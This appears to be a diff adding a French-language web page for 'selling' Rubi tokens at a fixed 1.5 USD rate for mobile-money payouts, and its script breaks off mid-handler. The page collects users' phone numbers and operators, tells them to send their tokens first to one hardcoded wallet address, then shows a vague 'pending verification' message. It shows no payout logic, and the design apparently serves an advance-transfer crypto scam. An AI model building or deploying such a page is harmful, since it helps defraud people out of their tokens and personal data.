@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vendre mes Rubi - Plateforme d'échange</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0b1a2e 0%, #1b2f44 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.07);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 2.5rem;
+            padding: 2.5rem 2rem;
+            width: 100%;
+            max-width: 580px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), inset 0 1px 1px rgba(255, 255, 255, 0.08);
+            transition: 0.3s;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 0.25rem;
+        }
+
+        h1 span {
+            background: linear-gradient(135deg, #ffd966, #ffb347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: 700;
+        }
+
+        .subhead {
+            color: #9bb5d4;
+            font-size: 0.95rem;
+            margin-bottom: 2rem;
+            border-left: 3px solid #ffb347;
+            padding-left: 1rem;
+            font-weight: 300;
+        }
+
+        .rate-badge {
+            background: #102433;
+            border-radius: 60px;
+            padding: 0.6rem 1.2rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.6rem;
+            color: #b9d9ff;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+            border: 1px solid #2f4b6e;
+        }
+
+        .rate-badge strong {
+            color: #ffd966;
+            font-size: 1.1rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+
+        label {
+            display: block;
+            color: #cbdff5;
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin-bottom: 0.6rem;
+            letter-spacing: 0.3px;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            background: #0e1f2f;
+            border: 1.5px solid #2a4058;
+            border-radius: 1.4rem;
+            font-size: 1rem;
+            color: #ffffff;
+            outline: none;
+            transition: 0.2s;
+            font-weight: 400;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+
+        select {
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='%239bb5d4' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 1.2rem center;
+            background-size: 1.2rem;
+        }
+
+        select option {
+            background: #0e1f2f;
+            color: white;
+            padding: 1rem;
+        }
+
+        select:focus, input:focus {
+            border-color: #ffb347;
+            box-shadow: 0 0 0 4px rgba(255, 179, 71, 0.15);
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            align-items: stretch;
+            background: #0e1f2f;
+            border: 1.5px solid #2a4058;
+            border-radius: 1.4rem;
+            overflow: hidden;
+            transition: 0.2s;
+        }
+
+        .phone-input-wrapper:focus-within {
+            border-color: #ffb347;
+            box-shadow: 0 0 0 4px rgba(255, 179, 71, 0.15);
+        }
+
+        .phone-prefix {
+            background: #1b3349;
+            padding: 1rem 1.1rem;
+            font-weight: 600;
+            color: #ffd966;
+            display: flex;
+            align-items: center;
+            white-space: nowrap;
+            font-size: 1rem;
+            border-right: 1.5px solid #2a4058;
+            min-width: 90px;
+            justify-content: center;
+        }
+
+        .phone-input-wrapper input {
+            border: none;
+            border-radius: 0;
+            background: transparent;
+            flex: 1;
+            padding: 1rem 1.2rem;
+        }
+
+        .phone-input-wrapper input:focus {
+            box-shadow: none;
+            border: none;
+        }
+
+        .conversion-box {
+            background: #0b1b29;
+            border-radius: 1.6rem;
+            padding: 1.2rem 1.4rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #1f3547;
+            margin-top: 0.5rem;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .conversion-box .label {
+            color: #8aa3c0;
+            font-size: 0.9rem;
+        }
+
+        .conversion-box .value {
+            color: #ffd966;
+            font-weight: 700;
+            font-size: 1.3rem;
+        }
+
+        .operator-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.8rem;
+            margin-top: 0.2rem;
+        }
+
+        .operator-option {
+            background: #0e1f2f;
+            border: 1.5px solid #2a4058;
+            border-radius: 1.4rem;
+            padding: 1rem 0.8rem;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.15s;
+            color: #b9d0e9;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .operator-option:hover {
+            background: #142b3e;
+            border-color: #4f7da3;
+        }
+
+        .operator-option.selected {
+            background: #1e3b53;
+            border-color: #ffb347;
+            color: white;
+            box-shadow: 0 0 0 2px rgba(255, 179, 71, 0.3);
+        }
+
+        .operator-option i {
+            font-style: normal;
+            font-size: 1.1rem;
+        }
+
+        button {
+            width: 100%;
+            padding: 1.2rem;
+            background: linear-gradient(135deg, #ffb347, #ff9f1c);
+            border: none;
+            border-radius: 2rem;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #0a1620;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 1.2rem;
+            box-shadow: 0 10px 25px -5px rgba(255, 159, 28, 0.4);
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #ffc15e, #ffaa2b);
+            transform: scale(1.01);
+            box-shadow: 0 15px 30px -5px rgba(255, 159, 28, 0.6);
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer-note {
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: #627a96;
+            text-align: center;
+        }
+
+        .info-icon {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            background: #1f3547;
+            color: #9bb5d4;
+            border-radius: 50%;
+            font-size: 12px;
+            text-align: center;
+            line-height: 18px;
+            margin-left: 6px;
+            cursor: help;
+            font-weight: 600;
+        }
+
+        .payment-screen {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .payment-screen.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .alert-box {
+            background: linear-gradient(135deg, rgba(255, 179, 71, 0.15), rgba(255, 159, 28, 0.08));
+            border: 1.5px solid #ffb347;
+            border-radius: 1.4rem;
+            padding: 1.2rem 1.4rem;
+            margin-bottom: 1.8rem;
+        }
+
+        .alert-box .alert-title {
+            color: #ffd966;
+            font-weight: 700;
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-box p {
+            color: #cbdff5;
+            font-size: 0.92rem;
+            line-height: 1.5;
+        }
+
+        .wallet-address-box {
+            background: #0a1725;
+            border: 1.5px dashed #ffb347;
+            border-radius: 1.4rem;
+            padding: 1.2rem;
+            margin-bottom: 1.8rem;
+            text-align: center;
+        }
+
+        .wallet-address-box .addr-label {
+            color: #8aa3c0;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.6rem;
+        }
+
+        .wallet-address {
+            color: #ffd966;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            font-weight: 700;
+            word-break: break-all;
+            line-height: 1.4;
+            user-select: all;
+        }
+
+        .copy-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #1b3349;
+            color: #ffd966;
+            border: 1px solid #2f4b6e;
+            border-radius: 60px;
+            padding: 0.5rem 1rem;
+            font-size: 0.8rem;
+            cursor: pointer;
+            margin-top: 0.8rem;
+            transition: 0.2s;
+            font-weight: 600;
+            width: auto;
+        }
+
+        .copy-btn:hover {
+            background: #24425d;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .copy-btn.copied {
+            background: #1e5a3b;
+            color: #b6ffd6;
+            border-color: #2fbf6b;
+        }
+
+        .summary-box {
+            background: #0b1b29;
+            border-radius: 1.4rem;
+            padding: 1.2rem 1.4rem;
+            border: 1px solid #1f3547;
+            margin-bottom: 1.8rem;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem 0;
+            font-size: 0.9rem;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+
+        .summary-row .s-label {
+            color: #8aa3c0;
+        }
+
+        .summary-row .s-value {
+            color: #ffffff;
+            font-weight: 600;
+            text-align: right;
+        }
+
+        .summary-row .s-value.gold {
+            color: #ffd966;
+        }
+
+        .back-btn {
+            background: transparent;
+            border: 1.5px solid #2a4058;
+            color: #9bb5d4;
+            box-shadow: none;
+            font-size: 0.95rem;
+            padding: 0.9rem;
+            margin-top: 0.8rem;
+        }
+
+        .back-btn:hover {
+            background: #142b3e;
+            transform: none;
+            box-shadow: none;
+            color: white;
+        }
+
+        .verif-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(10, 22, 32, 0.3);
+            border-top-color: #0a1620;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Message de paiement en attente */
+        .pending-msg {
+            background: linear-gradient(135deg, rgba(255, 179, 71, 0.18), rgba(255, 159, 28, 0.06));
+            border: 1.5px solid #ffb347;
+            border-radius: 1.4rem;
+            padding: 1.4rem;
+            text-align: center;
+            color: #ffe0b3;
+            margin-top: 1.5rem;
+            display: none;
+        }
+
+        .pending-msg.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .pending-msg .icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            display: inline-block;
+            animation: pulseHourglass 1.8s ease-in-out infinite;
+        }
+
+        @keyframes pulseHourglass {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.75; }
+        }
+
+        .pending-msg h3 {
+            color: #ffd966;
+            margin-bottom: 0.5rem;
+            font-size: 1.15rem;
+        }
+
+        .pending-msg p {
+            font-size: 0.9rem;
+            color: #e6dcc9;
+            line-height: 1.55;
+        }
+
+        .pending-msg .highlight {
+            color: #ffd966;
+            font-weight: 700;
+        }
+
+        .pending-msg .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 179, 71, 0.2);
+            border: 1px solid #ffb347;
+            color: #ffd966;
+            padding: 0.35rem 0.85rem;
+            border-radius: 60px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 0.9rem;
+        }
+
+        .pending-msg .status-badge .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ffb347;
+            animation: blinkDot 1.2s ease-in-out infinite;
+        }
+
+        @keyframes blinkDot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.25; }
+        }
+
+        /* ========== MODAL ========== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(3, 10, 20, 0.75);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            z-index: 9999;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.25s ease, visibility 0.25s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: linear-gradient(145deg, #102433 0%, #142b3e 100%);
+            border: 1.5px solid rgba(255, 179, 71, 0.25);
+            border-radius: 2rem;
+            padding: 2rem 1.8rem 1.6rem;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.7), inset 0 1px 1px rgba(255, 255, 255, 0.06);
+            text-align: center;
+            transform: scale(0.9) translateY(15px);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+        }
+
+        .modal-overlay.active .modal {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.2rem;
+            margin: 0 auto 1.2rem;
+            animation: modalIconPop 0.4s ease;
+        }
+
+        @keyframes modalIconPop {
+            0% { transform: scale(0); }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        .modal-icon.error {
+            background: rgba(231, 76, 60, 0.18);
+            border: 2px solid rgba(231, 76, 60, 0.6);
+            color: #ff7675;
+        }
+
+        .modal-icon.warning {
+            background: rgba(255, 179, 71, 0.18);
+            border: 2px solid rgba(255, 179, 71, 0.6);
+            color: #ffd966;
+        }
+
+        .modal-icon.success {
+            background: rgba(46, 204, 113, 0.18);
+            border: 2px solid rgba(46, 204, 113, 0.6);
+            color: #2ecc71;
+        }
+
+        .modal-icon.info {
+            background: rgba(52, 152, 219, 0.18);
+            border: 2px solid rgba(52, 152, 219, 0.6);
+            color: #74b9ff;
+        }
+
+        .modal-title {
+            color: #ffffff;
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 0.7rem;
+            letter-spacing: -0.3px;
+        }
+
+        .modal-message {
+            color: #b9d0e9;
+            font-size: 0.95rem;
+            line-height: 1.55;
+            margin-bottom: 1.6rem;
+            font-weight: 400;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 0.7rem;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 0.95rem 1rem;
+            border-radius: 1.4rem;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            transition: 0.2s;
+            margin: 0;
+            letter-spacing: 0.3px;
+        }
+
+        .modal-btn.primary {
+            background: linear-gradient(135deg, #ffb347, #ff9f1c);
+            color: #0a1620;
+            box-shadow: 0 8px 20px -6px rgba(255, 159, 28, 0.5);
+        }
+
+        .modal-btn.primary:hover {
+            background: linear-gradient(135deg, #ffc15e, #ffaa2b);
+            transform: scale(1.02);
+            box-shadow: 0 10px 25px -6px rgba(255, 159, 28, 0.7);
+        }
+
+        .modal-btn.secondary {
+            background: transparent;
+            border: 1.5px solid #2a4058;
+            color: #9bb5d4;
+        }
+
+        .modal-btn.secondary:hover {
+            background: #142b3e;
+            color: white;
+            transform: scale(1.02);
+            box-shadow: none;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 1.8rem 1.2rem; }
+            h1 { font-size: 1.6rem; }
+            .operator-grid { grid-template-columns: 1fr; }
+            .modal { padding: 1.6rem 1.3rem 1.3rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- ===== ÉTAPE 1 ===== -->
+        <div id="step1">
+            <h1>💰 Vendre <span>Rubi</span></h1>
+            <div class="subhead">1 Rubi = 1,5 USD — recevez l'équivalent en monnaie locale</div>
+
+            <div class="rate-badge">
+                ⚡ Taux fixe : <strong>1 RUBI = 1,50 $</strong> · Min. 50 RUBI
+            </div>
+
+            <form id="sellForm" onsubmit="return false;">
+                <div class="form-group">
+                    <label>🌍 Choisissez votre pays</label>
+                    <select id="countrySelect" required>
+                        <option value="" disabled selected>-- Sélectionnez un pays --</option>
+                        <option value="SN" data-symbol="FCFA" data-rate="600" data-dial="+221">🇸🇳 Sénégal (FCFA)</option>
+                        <option value="CI" data-symbol="FCFA" data-rate="600" data-dial="+225">🇨🇮 Côte d'Ivoire (FCFA)</option>
+                        <option value="CM" data-symbol="FCFA" data-rate="600" data-dial="+237">🇨🇲 Cameroun (FCFA)</option>
+                        <option value="ML" data-symbol="FCFA" data-rate="600" data-dial="+223">🇲🇱 Mali (FCFA)</option>
+                        <option value="BF" data-symbol="FCFA" data-rate="600" data-dial="+226">🇧🇫 Burkina Faso (FCFA)</option>
+                        <option value="CD" data-symbol="FC" data-rate="2800" data-dial="+243">🇨🇩 RD Congo (FC)</option>
+                        <option value="NG" data-symbol="₦" data-rate="1500" data-dial="+234">🇳🇬 Nigéria (₦)</option>
+                        <option value="GH" data-symbol="GH₵" data-rate="15" data-dial="+233">🇬🇭 Ghana (GH₵)</option>
+                        <option value="KE" data-symbol="KSh" data-rate="130" data-dial="+254">🇰🇪 Kenya (KSh)</option>
+                        <option value="MA" data-symbol="DH" data-rate="10" data-dial="+212">🇲🇦 Maroc (DH)</option>
+                        <option value="DZ" data-symbol="DA" data-rate="135" data-dial="+213">🇩🇿 Algérie (DA)</option>
+                        <option value="TN" data-symbol="DT" data-rate="3.1" data-dial="+216">🇹🇳 Tunisie (DT)</option>
+                        <option value="FR" data-symbol="€" data-rate="0.92" data-dial="+33">🇫🇷 France (€)</option>
+                        <option value="US" data-symbol="$" data-rate="1" data-dial="+1">🇺🇸 États-Unis ($)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>💎 Montant en Rubi à vendre <span class="info-icon" title="Minimum 50 Rubi">?</span></label>
+                    <input type="number" id="rubiAmount" min="50" step="1" value="50" placeholder="Min. 50" required>
+                </div>
+
+                <div class="form-group">
+                    <label>💱 Vous recevez</label>
+                    <div class="conversion-box">
+                        <span class="label">Montant local estimé :</span>
+                        <span class="value" id="localDisplay">0,00</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>📱 Choisissez l'opérateur de réception <span class="info-icon" title="Sélectionnez l'opérateur mobile money disponible dans votre pays">?</span></label>
+                    <div class="operator-grid" id="operatorGrid"></div>
+                    <input type="hidden" id="selectedOperator">
+                </div>
+
+                <div class="form-group">
+                    <label>📞 Numéro de téléphone (réception)</label>
+                    <div class="phone-input-wrapper">
+                        <span class="phone-prefix" id="dialCode">+---</span>
+                        <input type="tel" id="phoneNumber" placeholder="Numéro de téléphone" required>
+                    </div>
+                </div>
+
+                <button type="button" id="submitBtn">
+                    💸 VENDRE & RECEVOIR
+                </button>
+            </form>
+
+            <div class="footer-note">
+                Paiement traité instantanément · Vos Rubi sont convertis au taux de 1,5 USD
+            </div>
+        </div>
+
+        <!-- ===== ÉTAPE 2 ===== -->
+        <div id="step2" class="payment-screen">
+            <h1>🔐 Finaliser <span>la vente</span></h1>
+            <div class="subhead">Envoyez vos Rubi à l'adresse ci-dessous puis renseignez votre code (TAN)</div>
+
+            <div class="alert-box">
+                <div class="alert-title">⚠️ Étape obligatoire</div>
+                <p>Pour recevoir votre paiement, vous devez d'abord <strong>transférer vos Rubi</strong> à l'adresse officielle ci-dessous. Une fois le transfert effectué, renseignez le <strong>code de transaction (TAN)</strong> reçu et cliquez sur <strong>VÉRIFIER</strong>.</p>
+            </div>
+
+            <div class="wallet-address-box">
+                <div class="addr-label">Adresse de réception Rubi</div>
+                <div class="wallet-address" id="walletAddress">0x6657d9caa8ef11fab1f38822d8034fa9b3c4fd88</div>
+                <button type="button" class="copy-btn" id="copyBtn">
+                    📋 Copier l'adresse
+                </button>
+            </div>
+
+            <div class="summary-box">
+                <div class="summary-row">
+                    <span class="s-label">Montant à envoyer</span>
+                    <span class="s-value gold" id="sumRubi">50 RUBI</span>
+                </div>
+                <div class="summary-row">
+                    <span class="s-label">Vous recevrez</span>
+                    <span class="s-value gold" id="sumLocal">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="s-label">Opérateur</span>
+                    <span class="s-value" id="sumOperator">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="s-label">Téléphone</span>
+                    <span class="s-value" id="sumPhone">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="s-label">Pays</span>
+                    <span class="s-value" id="sumCountry">—</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>🔑 Code de transaction (TAN)</label>
+                <input type="text" id="txCode" placeholder="Entrez votre code TAN" autocomplete="off">
+            </div>
+
+            <button type="button" id="verifyBtn">
+                ✅ VÉRIFIER LA TRANSACTION
+            </button>
+
+            <button type="button" class="back-btn" id="backBtn">
+                ← Retour
+            </button>
+
+            <!-- Message de paiement en attente -->
+            <div class="pending-msg" id="pendingMsg">
+                <div class="status-badge"><span class="dot"></span> Paiement en attente</div>
+                <div class="icon">⏳</div>
+                <h3>Votre demande a été enregistrée</h3>
+                <p>
+                    Votre vente de <span class="highlight" id="pendingRubi">—</span> est en cours de vérification par notre équipe.
+                    Vous recevrez <span class="highlight" id="pendingAmount">—</span> sur votre compte
+                    <span class="highlight" id="pendingOperator">—</span> dès que le paiement sera validé.
+                </p>
+                <p style="margin-top: 0.8rem; font-size: 0.82rem; color: #b9a780;">
+                    🔔 Vous serez notifié dès réception de la confirmation.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== MODAL ========== -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal" role="dialog" aria-modal="true">
+            <div class="modal-icon" id="modalIcon">!</div>
+            <div class="modal-title" id="modalTitle">Titre</div>
+            <div class="modal-message" id="modalMessage">Message...</div>
+            <div class="modal-actions" id="modalActions"></div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const operatorsByCountry = {
+                'SN': ['Orange Money', 'Wave', 'Free Money', 'Wizall'],
+                'CI': ['Orange Money', 'MTN MoMo', 'Moov Money', 'Wave'],
+                'CM': ['Orange Money', 'MTN MoMo', 'Express Union'],
+                'ML': ['Orange Money', 'Moov Money', 'Wave'],
+                'BF': ['Orange Money', 'Moov Money', 'Wave'],
+                'CD': ['M-Pesa', 'Orange Money', 'Airtel Money', 'Afrimoney'],
+                'NG': ['Opay', 'PalmPay', 'Moniepoint', 'Kuda'],
+                'GH': ['MTN MoMo', 'Vodafone Cash', 'AirtelTigo Money'],
+                'KE': ['M-Pesa', 'Airtel Money', 'T-Kash'],
+                'MA': ['Inwi Money', 'Orange Money', 'Barid Cash'],
+                'DZ': ['Baridi Mob', 'Yassir Pay'],
+                'TN': ['D17', 'Orange Money', 'Sobflous'],
+                'FR': ['PayPal', 'Lydia', 'Revolut', 'Virement bancaire'],
+                'US': ['PayPal', 'Venmo', 'Cash App', 'Zelle'],
+            };
+
+            const WALLET_ADDRESS = '0x6657d9caa8ef11fab1f38822d8034fa9b3c4fd88';
+            const MIN_RUBI = 50;
+            const USD_TO_RUBI_RATE = 1.5;
+
+            // ========== MODAL ==========
+            const modalOverlay = document.getElementById('modalOverlay');
+            const modalIcon = document.getElementById('modalIcon');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalMessage = document.getElementById('modalMessage');
+            const modalActions = document.getElementById('modalActions');
+
+            const ICONS = { error: '✕', warning: '⚠', success: '✓', info: 'ℹ' };
+
+            function showModal(options) {
+                const {
+                    type = 'info',
+                    title = 'Information',
+                    message = '',
+                    okText = 'OK',
+                    cancelText = null,
+                    onOk = null,
+                    onCancel = null
+                } = options;
+
+                modalIcon.className = 'modal-icon ' + type;
+                modalIcon.textContent = ICONS[type] || ICONS.info;
+                modalTitle.textContent = title;
+                modalMessage.innerHTML = message;
+                modalActions.innerHTML = '';
+
+                if (cancelText) {
+                    const cancelBtn = document.createElement('button');
+                    cancelBtn.type = 'button';
+                    cancelBtn.className = 'modal-btn secondary';
+                    cancelBtn.textContent = cancelText;
+                    cancelBtn.addEventListener('click', function() {
+                        hideModal();
+                        if (typeof onCancel === 'function') onCancel();
+                    });
+                    modalActions.appendChild(cancelBtn);
+                }
+
+                const okBtn = document.createElement('button');
+                okBtn.type = 'button';
+                okBtn.className = 'modal-btn primary';
+                okBtn.textContent = okText;
+                okBtn.addEventListener('click', function() {
+                    hideModal();
+                    if (typeof onOk === 'function') onOk();
+                });
+                modalActions.appendChild(okBtn);
+
+                modalOverlay.classList.add('active');
+                setTimeout(() => okBtn.focus(), 250);
+
+                modalOverlay.onclick = function(e) {
+                    if (e.target === modalOverlay) {
+                        hideModal();
+                        if (typeof onCancel === 'function') onCancel();
+                    }
+                };
+            }
+
+            function hideModal() {
+                modalOverlay.classList.remove('active');
+                modalOverlay.onclick = null;
+            }
+
+            const showError = (title, message, onOk) => showModal({ type: 'error', title, message, onOk });
+            const showWarning = (title, message) => showModal({ type: 'warning', title, message });
+            const showSuccess = (title, message, onOk) => showModal({ type: 'success', title, message, onOk });
+            const showInfo = (title, message) => showModal({ type: 'info', title, message });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && modalOverlay.classList.contains('active')) hideModal();
+            });
+
+            // ========== ÉLÉMENTS ==========
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const countrySelect = document.getElementById('countrySelect');
+            const rubiInput = document.getElementById('rubiAmount');
+            const localDisplay = document.getElementById('localDisplay');
+            const operatorGrid = document.getElementById('operatorGrid');
+            const selectedOperatorInput = document.getElementById('selectedOperator');
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const dialCodeSpan = document.getElementById('dialCode');
+            const submitBtn = document.getElementById('submitBtn');
+
+            const sumRubi = document.getElementById('sumRubi');
+            const sumLocal = document.getElementById('sumLocal');
+            const sumOperator = document.getElementById('sumOperator');
+            const sumPhone = document.getElementById('sumPhone');
+            const sumCountry = document.getElementById('sumCountry');
+            const txCodeInput = document.getElementById('txCode');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const backBtn = document.getElementById('backBtn');
+            const copyBtn = document.getElementById('copyBtn');
+            const pendingMsg = document.getElementById('pendingMsg');
+
+            let currentTx = {};
+
+            // ========== HELPERS ==========
+            function formatLocal(amount, symbol) {
+                let formatted;
+                if (amount >= 1000) {
+                    formatted = amount.toLocaleString('fr-FR', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+                } else {
+                    formatted = amount.toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                }
+                return `${formatted} ${symbol}`;
+            }
+
+            function updateLocalAmount() {
+                const opt = countrySelect.options[countrySelect.selectedIndex];
+                if (!opt || !opt.value) { localDisplay.textContent = '0,00'; return; }
+                const rate = parseFloat(opt.dataset.rate) || 1;
+                const symbol = opt.dataset.symbol || '';
+                const rubi = parseFloat(rubiInput.value) || 0;
+                localDisplay.textContent = formatLocal(rubi * USD_TO_RUBI_RATE * rate, symbol);
+            }
+
+            function updateOperators() {
+                const country = countrySelect.value;
+                operatorGrid.innerHTML = '';
+                selectedOperatorInput.value = '';
+                if (!country) return;
+                const ops = operatorsByCountry[country] || ['Mobile Money', 'Autre'];
+                ops.forEach(op => {
+                    const div = document.createElement('div');
+                    div.className = 'operator-option';
+                    div.dataset.operator = op;
+                    div.innerHTML = `<i>📶</i> ${op}`;
+                    div.addEventListener('click', function() {
+                        document.querySelectorAll('.operator-option').forEach(el => el.classList.remove('selected'));
+                        this.classList.add('selected');
+                        selectedOperatorInput.value = op;
+                    });
+                    operatorGrid.appendChild(div);
+                });
+            }
+
+            function updateDialCode() {
+                const opt = countrySelect.options[countrySelect.selectedIndex];
+                if (opt && opt.dataset.dial) {
+                    dialCodeSpan.textContent = opt.dataset.dial;
+                    const examples = {
+                        'SN': '77 123 45 67', 'CI': '07 12 34 56 78', 'CM': '6 71 23 45 67',
+                        'ML': '76 12 34 56', 'BF': '70 12 34 56', 'CD': '81 234 56 78',
+                        'NG': '801 234 5678', 'GH': '24 123 4567', 'KE': '712 345 678',
+                        'MA': '6 12 34 56 78', 'DZ': '5 12 34 56 78', 'TN': '12 345 678',
+                        'FR': '6 12 34 56 78', 'US': '202 555 0123'
+                    };
+                    phoneNumberInput.placeholder = examples[countrySelect.value] || '123 456 789';
+                } else {
+                    dialCodeSpan.textContent = '+---';
+                    phoneNumberInput.placeholder = 'Numéro de téléphone';
+                }
+            }
+
+            // ========== ÉCOUTEURS ==========
+            countrySelect.addEventListener('change', function() {
+                updateOperators();
+                updateLocalAmount();
+                updateDialCode();
+                phoneNumberInput.value = '';
+            });
+            rubiInput.addEventListener('input', updateLocalAmount);
+
+            // ========== ÉTAPE 1 → 2 ==========
+            submitBtn.addEventListener('click', function() {
+                const country = countrySelect.value;
+                const rubi = parseFloat(rubiInput.value);
+                const operator = selectedOperatorInput.value;
+                const phone = phoneNumberInput.value.trim();
+
+                if (!country) { showWarning('Pays manquant', 'Veuillez sélectionner un pays pour continuer.'); return; }
+                if (!rubi || rubi < MIN_RUBI) {
+                    showError('Montant insuffisant', `Le montant minimum de Rubi à vendre est de <strong>${MIN_RUBI} RUBI</strong>. Veuillez ajuster votre montant.`);
+                    return;
+                }
+                if (!operator) { showWarning('Opérateur manquant', 'Veuillez choisir un opérateur de réception mobile money.'); return; }
+                if (!phone) { showWarning('Numéro manquant', 'Veuillez saisir votre numéro de téléphone pour recevoir le paiement.'); return; }
+
+                const opt = countrySelect.options[countrySelect.selectedIndex];
+                const rate = parseFloat(opt.dataset.rate) || 1;
+                const symbol = opt.dataset.symbol || '';
+                const dialCode = opt.dataset.dial || '';
+                const localAmount = rubi * USD_TO_RUBI_RATE * rate;
+
+                currentTx = {
+                    rubi, localAmount, symbol, operator, phone,
+                    country: opt.textContent.trim(),
+                    dialCode, ratePerUsd: rate
+                };
+
+                sumRubi.textContent = `${rubi} RUBI`;
+                sumLocal.textContent = formatLocal(localAmount, symbol);
+                sumOperator.textContent = operator;
+                sumPhone.textContent = `${dialCode} ${phone}`;
